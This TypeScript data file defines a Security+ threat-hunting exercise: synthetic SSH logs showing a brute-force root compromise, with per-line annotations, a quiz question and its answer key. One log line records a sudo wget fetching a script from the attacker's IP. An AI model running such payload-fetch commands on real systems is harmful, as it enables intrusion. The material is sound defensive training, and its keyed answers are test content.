import type { ThreatHuntScenario } from "../types";

/**
 * Threat Hunt scenarios for Security+ (SY0-701). Domain 4.0 Security
 * Operations — log analysis is core to the exam and to SOC work. Logs are
 * realistic but synthetic; times/IPs are illustrative.
 */
export const securityPlusThreatHunts: ThreatHuntScenario[] = [
  {
    type: "threat-hunt",
    id: "sec-hunt-ssh-bruteforce",
    title: "Compromised SSH server",
    briefing:
      "It's 02:10 and an alert fired on web-prod-01. Read the authentication log below and flag every line that is evidence of the attack — then identify what happened. Benign noise is mixed in; flag only the lines that matter.",
    domain_number: "4.0",
    domain_title: "Security Operations",
    logSource: "/var/log/auth.log · web-prod-01 (198.51.100.10)",
    lines: [
      {
        text: "01:59:58 sshd[2011]: Accepted publickey for deploy from 10.0.4.12 port 51022 ssh2",
        malicious: false,
        note: "Key-based login from an internal deploy host — expected.",
      },
      {
        text: "02:03:11 sshd[2044]: Failed password for root from 203.0.113.77 port 40122 ssh2",
        malicious: true,
        note: "First failed root attempt from an external IP — the start of the burst.",
      },
      {
        text: "02:03:12 sshd[2044]: Failed password for root from 203.0.113.77 port 40124 ssh2",
        malicious: true,
        note: "Second failure, same source, one second later — automated guessing.",
      },
      {
        text: "02:03:12 sshd[2044]: Failed password for root from 203.0.113.77 port 40126 ssh2",
        malicious: true,
        note: "Rapid repeated failures against root — brute-force signature.",
      },
      {
        text: "02:03:13 sshd[2044]: Failed password for admin from 203.0.113.77 port 40130 ssh2",
        malicious: true,
        note: "Same attacker now cycling usernames — still the brute force.",
      },
      {
        text: "02:03:15 CRON[2050]: pam_unix(cron:session): session opened for user www-data",
        malicious: false,
        note: "Routine cron session — unrelated to the attack.",
      },
      {
        text: "02:03:19 sshd[2044]: Failed password for root from 203.0.113.77 port 40140 ssh2",
        malicious: true,
        note: "The guessing continues — dozens of attempts in seconds.",
      },
      {
        text: "02:03:24 sshd[2061]: Accepted password for root from 203.0.113.77 port 40170 ssh2",
        malicious: true,
        note: "The critical line: a successful root login from the SAME attacking IP. The brute force worked.",
      },
      {
        text: "02:03:41 sudo:     root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.77/x.sh",
        malicious: true,
        note: "Post-compromise: the attacker pulls a payload from their own IP.",
      },
      {
        text: "02:05:02 sshd[2079]: Accepted publickey for deploy from 10.0.4.12 port 51044 ssh2",
        malicious: false,
        note: "Another normal internal deploy login — benign.",
      },
      {
        text: "02:06:33 systemd-logind[812]: New session c3 of user deploy.",
        malicious: false,
        note: "Session bookkeeping for the legitimate deploy user.",
      },
      {
        text: "02:07:10 sshd[2101]: Received disconnect from 203.0.113.77 port 40170:11: disconnected by user",
        malicious: true,
        note: "The attacker's session closing — same IP, ties the activity together.",
      },
    ],
    question: "What does this evidence indicate?",
    options: [
      "A distributed denial-of-service (DDoS) attack against the SSH service",
      "A brute-force attack that succeeded, resulting in root compromise and payload download",
      "A misconfigured backup job repeatedly failing to authenticate",
      "An insider using stolen deploy keys to exfiltrate data",
    ],
    correctOption: 1,
    explanation:
      "The pattern is a textbook brute-force compromise. A single external IP (203.0.113.77) generates a rapid burst of failed root and admin logins, then lands an 'Accepted password for root' from that same IP — the guessing succeeded. What follows confirms compromise: a sudo-run wget pulling a script from the attacker's own address (payload staging), then the session disconnecting. The internal deploy logins and the cron session are ordinary noise. It isn't DDoS (the goal is access, not availability), a backup job wouldn't succeed as root then download a payload, and the deploy key logins are from an internal host, not the attacker. Response: isolate the host, block the IP, rotate credentials, and treat root as compromised — rebuild rather than clean.",
    estimatedMinutes: 4,
  },
];
